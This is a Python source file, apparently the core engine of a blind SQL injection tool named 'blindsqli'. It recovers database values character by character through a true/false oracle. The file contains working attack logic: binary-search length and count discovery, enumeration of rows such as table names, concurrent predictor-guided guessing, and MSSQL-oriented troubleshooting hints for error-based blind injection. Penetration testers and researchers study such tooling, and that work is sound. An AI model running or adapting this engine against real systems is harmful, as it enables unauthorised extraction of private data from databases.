"""Exfiltration engine and adaptive search strategy.

Given a :class:`~blindsqli.targets.Target`, recover its scalar value one position
at a time using the boolean oracle. The search is adaptive:

  1. Discover the value length by binary search (bounded by max_length).
  2. For each position:
       a. ask the sequence predictor for multi-character continuations worth
          verifying, and test the best ones concurrently -- a hit advances
          several positions in a single confirmed request;
       b. otherwise ask the character predictor to rank candidates and test the
          top few speculatively (concurrently);
       c. if prediction misses, fall back to a deterministic binary search over
          the ordered charset so the character is always found.
  3. Verify every accepted character/sequence through the oracle -- a prediction
     is only ever a *hypothesis*; the oracle is the sole source of truth.
  4. Update both predictors with each confirmed character.

Concurrency uses a bounded worker pool. Because a position is fully resolved
before the prefix advances, characters stay in order even though individual
requests finish out of order.
"""

from __future__ import annotations

import math
import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

from .config import Config
from .logging_util import Logger
from .oracle import BooleanOracle
from .predictor import CharacterPredictor
from .reporting import NullReporter, ProgressState, Reporter
from .result_types import OracleResult
from .sequence import SequencePredictor
from .targets import Target

# Sentinel returned by length discovery when the target is NULL/absent, so a
# missing row is not mistaken for a value longer than max_length.
_MISSING = -1


@dataclass
class ExtractionResult:
    target: str
    value: str
    complete: bool
    length: Optional[int]
    truncated: bool = False
    undetermined_at: Optional[int] = None
    requests_completed: int = 0
    requests_failed: int = 0
    cancelled: bool = False
    # None -> existence was not probed; True/False -> the target does/doesn't
    # yield a non-NULL value. False means extraction was skipped as pointless.
    exists: Optional[bool] = None
    notes: List[str] = field(default_factory=list)

    @property
    def missing(self) -> bool:
        return self.exists is False

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "value": self.value,
            "complete": self.complete,
            "length": self.length,
            "truncated": self.truncated,
            "undetermined_at": self.undetermined_at,
            "cancelled": self.cancelled,
            "exists": self.exists,
            "notes": self.notes,
        }


class ExfiltrationEngine:
    def __init__(
        self,
        config: Config,
        oracle: BooleanOracle,
        char_predictor: Optional[CharacterPredictor] = None,
        seq_predictor: Optional[SequencePredictor] = None,
        logger: Optional[Logger] = None,
        reporter: Optional[Reporter] = None,
        cancel_token: Optional[threading.Event] = None,
    ) -> None:
        self.config = config
        self.oracle = oracle
        self.logger = logger or Logger(config.verbosity)
        self.reporter = reporter or NullReporter()
        self._cancel = cancel_token or threading.Event()
        self.char_predictor = char_predictor or CharacterPredictor(
            config.charset, order=config.predictor_order
        )
        self.seq_predictor = seq_predictor or SequencePredictor(
            min_prefix=config.min_seq_prefix
        )
        self.ordered_charset = sorted(set(config.charset))
        # running estimate of requests spent per character, for the cost model
        self._req_per_char = max(1.0, math.log2(max(2, len(self.ordered_charset))))

    def request_cancel(self) -> None:
        """Ask extraction to stop cleanly at the next checkpoint."""
        self._cancel.set()

    def cancelled(self) -> bool:
        return self._cancel.is_set()

    # ------------------------------------------------------------- public API
    def exists(self, target: Target) -> Optional[bool]:
        """Verify the target yields a (non-NULL) value, in one boolean question.

        Returns True/False, or None if the oracle could not decide. Extraction
        uses this to avoid iterating character by character over a row that is
        not there.
        """
        self.oracle.ensure_classifier()
        return self._is_true(target.exists_condition())

    def extract(self, target: Target) -> ExtractionResult:
        """Recover the full scalar value for *target*."""
        self.oracle.ensure_classifier()  # calibrate before any concurrency

        present: Optional[bool] = None
        if self.config.verify_exists:
            present = self.exists(target)
            if present is False:
                self.logger.info(f"{target.name} does not exist (NULL); "
                                 f"skipping extraction")
                return self._finish(target, "", False, None, exists=False)

        length = None
        if self.config.discover_length:
            length = self._discover_length(target)
            if length == _MISSING:
                # length discovery proved the target is NULL/absent
                self.logger.info(f"{target.name} does not exist (NULL); "
                                 f"nothing to extract")
                return self._finish(target, "", False, None, exists=False)
            if length == 0:
                return self._finish(target, "", True, 0, exists=present)

        truncated = False
        value = ""
        undetermined = None

        with ThreadPoolExecutor(max_workers=self.config.workers) as pool:
            while True:
                if self._cancel.is_set():
                    self.logger.info(f"cancelled; stopping with partial value {value!r}")
                    break
                if length is not None and len(value) >= length:
                    break
                if length is None and len(value) >= self.config.max_length:
                    truncated = True
                    break

                pos = len(value) + 1  # SQL SUBSTRING is 1-based
                remaining = (length - len(value)) if length is not None else self.config.max_length

                # Without up-front length discovery, detect the end of the
                # string: SUBSTRING past the end returns '' in these dialects.
                if length is None:
                    end = self._is_true(target.char_is(pos, ""))
                    if end is True:
                        break
                    # end is None -> undetermined; fall through and let the
                    # position resolver decide (it will report undetermined).

                accepted, cand, conf, oracle_str = self._resolve_position(
                    pool, target, value, pos, remaining
                )
                if accepted is None:
                    undetermined = pos
                    self.logger.error(f"position {pos} undetermined; stopping extraction")
                    break

                value += accepted
                # learn from every confirmed character
                for i, ch in enumerate(accepted):
                    self.char_predictor.learn_transition(value[: len(value) - len(accepted) + i], ch)
                self._report(target, pos, value, cand, oracle_str, conf, length)

        cancelled = self._cancel.is_set()
        complete = (
            undetermined is None and not truncated and not cancelled
            and (length is None or len(value) == length)
        )
        # feed the finished value into both predictors for future targets
        self.char_predictor.learn_value(value)
        self.seq_predictor.learn_value(value)
        # a value was recovered (or partially), so the target does exist
        exists = True if (present is None and value != "") else present
        return self._finish(target, value, complete, length, truncated,
                            undetermined, cancelled, exists=exists)

    # --------------------------------------------------------------- count
    def discover_count(self, count_expr: str, max_count: int = 4096) -> Optional[int]:
        """Binary-search the integer value of a COUNT(*) scalar expression.

        Used to learn how many rows to enumerate (e.g. how many table names)
        before extracting each. Returns None if a probe is undetermined.
        """
        self.oracle.ensure_classifier()
        if self._cancel.is_set():
            self.logger.info("cancelled before count discovery")
            return None
        hi = max_count
        if self._is_true(f"{count_expr} <= {hi}") is not True:
            self.logger.error(f"count exceeds max_count={hi}")
            return hi
        lo = 0
        while lo < hi:
            if self._cancel.is_set():
                self.logger.info("cancelled during count discovery")
                return None
            mid = (lo + hi) // 2
            res = self._is_true(f"{count_expr} <= {mid}")
            if res is True:
                hi = mid
            elif res is False:
                lo = mid + 1
            else:
                self.logger.error("count probe undetermined")
                return None
        self.logger.info(f"discovered count: {lo}")
        return lo

    # --------------------------------------------------------------- length
    def _discover_length(self, target: Target) -> int:
        """Binary search the value length in [0, max_length]."""
        lo, hi = 0, self.config.max_length
        # First confirm it is within bound.
        if self._is_true(target.length_le(hi)) is not True:
            # LEN(...) <= hi being not-true can mean the value is genuinely
            # longer than the cap, OR that the target is NULL/absent (LEN(NULL)
            # is NULL, which also reads as not <= hi). One existence probe tells
            # them apart, so a missing row is not extracted 64 futile times.
            if self.exists(target) is False:
                return _MISSING
            self.logger.verbose(
                f"value longer than max_length={hi}; will extract up to the cap"
            )
            return hi
        # minimal n with length_le(n) true
        while lo < hi:
            mid = (lo + hi) // 2
            res = self._is_true(target.length_le(mid))
            if res is True:
                hi = mid
            elif res is False:
                lo = mid + 1
            else:
                self.logger.error("length probe undetermined; assuming max_length")
                return self.config.max_length
        self.logger.info(f"discovered length of {target.name}: {lo}")
        return lo

    # ------------------------------------------------------------- position
    def _resolve_position(
        self, pool: ThreadPoolExecutor, target: Target, prefix: str, pos: int, remaining: int
    ) -> Tuple[Optional[str], str, float, str]:
        """Resolve the character(s) at *pos*. Returns (accepted, candidate,
        confidence, oracle_str); accepted is None if undetermined."""

        # -- phase S: sequence hypotheses (multi-char, one request each) ------
        if self.config.strategy == "adaptive":
            seq = self._try_sequences(pool, target, prefix, pos, remaining)
            if seq is not None:
                return seq, seq, 0.9, "TRUE(seq)"

        # -- phase C: single character ---------------------------------------
        ranked = self.char_predictor.rank(prefix, self.ordered_charset)
        top_conf = ranked[0][1] if ranked else 0.0

        if self.config.strategy == "binary":
            ch = self._binary_search_char(target, pos)
            return (ch, ch or "?", top_conf, "TRUE" if ch else "UNDET")

        if self.config.strategy == "linear":
            ch = self._linear_char(target, pos, ranked)
            return (ch, ch or "?", top_conf, "TRUE" if ch else "UNDET")

        # adaptive: speculative predicted batch, then binary fallback
        ch = self._speculative_char(pool, target, pos, ranked)
        if ch is not None:
            self._record_char_cost(1)
            return ch, ch, top_conf, "TRUE"
        ch = self._binary_search_char(target, pos)
        if ch is not None:
            return ch, ch, top_conf, "TRUE(bin)"
        return None, "?", top_conf, "UNDET"

    # -- sequence phase -------------------------------------------------------
    def _try_sequences(
        self, pool: ThreadPoolExecutor, target: Target, prefix: str, pos: int, remaining: int
    ) -> Optional[str]:
        hyps = self.seq_predictor.propose(prefix, remaining)
        # keep only those the cost model says are worth a shot
        worth = [h for h in hyps if self.seq_predictor.worth_testing(h, self._req_per_char)]
        worth = worth[: self.config.seq_batch]
        if not worth:
            return None
        self.logger.verbose(
            "sequence hypotheses: " + ", ".join(f"{h.sequence!r}@{h.probability:.2f}" for h in worth)
        )
        # test concurrently; among TRUE ones pick the longest (most progress)
        futures = {pool.submit(self._is_true, target.substring_is(pos, h.sequence)): h for h in worth}
        winner: Optional[str] = None
        for fut, h in list(futures.items()):
            if fut.result() is True and (winner is None or len(h.sequence) > len(winner)):
                winner = h.sequence
        if winner:
            self.logger.info(f"sequence confirmed at pos {pos}: {winner!r}")
        return winner

    # -- char phases ----------------------------------------------------------
    def _speculative_char(
        self, pool: ThreadPoolExecutor, target: Target, pos: int, ranked
    ) -> Optional[str]:
        """Test the top predicted characters concurrently; at most one is TRUE."""
        batch = [ch for ch, _ in ranked[: max(1, self.config.char_batch)]]
        futures = {pool.submit(self._is_true, target.char_is(pos, ch)): ch for ch in batch}
        found: Optional[str] = None
        for fut, ch in futures.items():
            if fut.result() is True:
                found = ch  # unique per position
        return found

    def _linear_char(self, target: Target, pos: int, ranked) -> Optional[str]:
        for ch, _ in ranked:
            if self._is_true(target.char_is(pos, ch)) is True:
                return ch
        return None

    def _binary_search_char(self, target: Target, pos: int) -> Optional[str]:
        """Deterministic ordinal binary search over the ordered charset."""
        chars = self.ordered_charset
        lo, hi = 0, len(chars) - 1
        steps = 0
        while lo < hi:
            mid = (lo + hi) // 2
            res = self._is_true(target.char_le(pos, chars[mid]))
            steps += 1
            if res is True:
                hi = mid
            elif res is False:
                lo = mid + 1
            else:
                self.logger.error(f"binary-search comparison undetermined at pos {pos}")
                return None
        candidate = chars[lo]
        # verify -- guards against a character outside the charset or a broken
        # ordering assumption.
        if self._is_true(target.char_is(pos, candidate)) is True:
            self._record_char_cost(steps + 1)
            return candidate
        # The ordering-based search disagreed with equality. That happens when
        # the '<=' comparison behaves differently from the charset ordering
        # (collation mismatch) or when every comparison errored (an invalid
        # condition reads as FALSE in error-based blind SQLi). Fall back to an
        # order-independent equality scan, which does not rely on '<='.
        self.logger.verbose(
            f"binary search picked {candidate!r} at pos {pos} but verification "
            f"failed; falling back to a linear equality scan"
        )
        found = self._linear_scan(target, pos)
        if found is not None:
            return found
        self.logger.error(
            f"position {pos}: no configured charset character verified true. In "
            f"error-based blind SQLi an invalid SQL condition also reads as FALSE, "
            f"so this usually means the condition is malformed for this target -- "
            f"check --dialect (is it really MSSQL?), try --no-collation or "
            f"--collation, or widen --charset."
        )
        return None

    def _linear_scan(self, target: Target, pos: int) -> Optional[str]:
        """Try every charset character by equality (order-independent)."""
        for ch in self.ordered_charset:
            if self._is_true(target.char_is(pos, ch)) is True:
                return ch
        return None

    # ------------------------------------------------------------- helpers
    def _is_true(self, condition: str) -> Optional[bool]:
        """Return True/False for a definite oracle answer, or None if the oracle
        could not decide (TIMEOUT/REQUEST_ERROR/UNKNOWN). Never coerces to False.
        """
        obs = self.oracle.ask(condition)
        if obs.result is OracleResult.TRUE:
            return True
        if obs.result is OracleResult.FALSE:
            return False
        self.logger.verbose(f"non-definite oracle result {obs.result.value} for [{condition}]")
        return None

    def _record_char_cost(self, requests: int) -> None:
        # exponential moving average of requests-per-char, feeds the cost model
        self._req_per_char = 0.7 * self._req_per_char + 0.3 * float(requests)

    def _report(self, target, pos, value, candidate, oracle_str, conf, length) -> None:
        self.reporter.update(
            ProgressState(
                target=target.name,
                position=pos,
                known_prefix=value,
                candidate=candidate,
                oracle_result=oracle_str,
                confidence=conf,
                requests_completed=self.oracle.requests_completed,
                requests_failed=self.oracle.requests_failed,
                est_total=length,
            )
        )

    def _finish(self, target, value, complete, length, truncated=False,
                undetermined=None, cancelled=False, exists=None) -> ExtractionResult:
        result = ExtractionResult(
            target=target.name,
            value=value,
            complete=complete,
            length=length,
            truncated=truncated,
            undetermined_at=undetermined,
            cancelled=cancelled,
            exists=exists,
            requests_completed=self.oracle.requests_completed,
            requests_failed=self.oracle.requests_failed,
        )
        if exists is False:
            result.notes.append("target does not exist (NULL); extraction skipped")
        if truncated:
            result.notes.append(f"stopped at max_length={self.config.max_length}")
        if undetermined is not None:
            result.notes.append(f"undetermined character at position {undetermined}")
        if cancelled:
            result.notes.append("stopped by user before completion")
        self.reporter.result(target.name, value, complete)
        return result
